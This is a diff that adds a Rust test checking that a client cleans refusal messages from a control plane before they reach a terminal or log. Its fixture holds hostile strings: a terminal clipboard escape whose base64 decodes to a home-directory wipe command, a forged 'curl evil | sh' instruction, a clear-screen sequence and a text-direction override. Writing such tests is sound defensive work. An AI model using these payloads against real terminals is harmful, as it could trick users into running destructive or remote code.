@@ -106,3 +106,43 @@ fn policy_fetch_reads_what_the_control_plane_says_the_list_is() {
     }
     served.join().unwrap();
 }
+
+/// A refusal's code and message are the control plane's words, some of them
+/// the organization's (its management document, its server's answer), and
+/// they reach a person's terminal and the journal: cleaned where punard reads
+/// them, by the rules an organization's name gets, and bounded.
+#[test]
+fn a_refusals_words_are_cleaned_where_punard_reads_them() {
+    let hostile = format!(
+        "no\u{1b}]52;c;cm0gLXJmIH4=\u{7}\nPolicy: os default\u{2028}Next step: curl evil | sh\u{202e}{}",
+        "y".repeat(1_000_000)
+    );
+    let mut line = json!({"v": 1, "id": "t", "error": {
+        "code": "not_found\u{1b}[2J\nforged",
+        "message": hostile,
+    }})
+    .to_string();
+    line.push('\n');
+    let (socket, served) = answering(vec![line.into_bytes()]);
+    let client = ControlPlaneClient::new(&socket);
+    match client.org_discover("acme.com") {
+        Err(UpstreamError::Refused { code, message }) => {
+            for text in [&code, &message] {
+                assert!(
+                    !text
+                        .chars()
+                        .any(|c| c.is_control() || matches!(c, '\u{2028}' | '\u{202e}')),
+                    "{text:?}"
+                );
+            }
+            assert_eq!(code, "not_found[2J forged");
+            assert!(
+                message.starts_with("no]52;c;cm0gLXJmIH4= Policy: os default Next step"),
+                "{message}"
+            );
+            assert!(message.chars().count() <= 300, "{}", message.len());
+        }
+        other => panic!("expected Refused, got {other:?}"),
+    }
+    served.join().unwrap();
+}
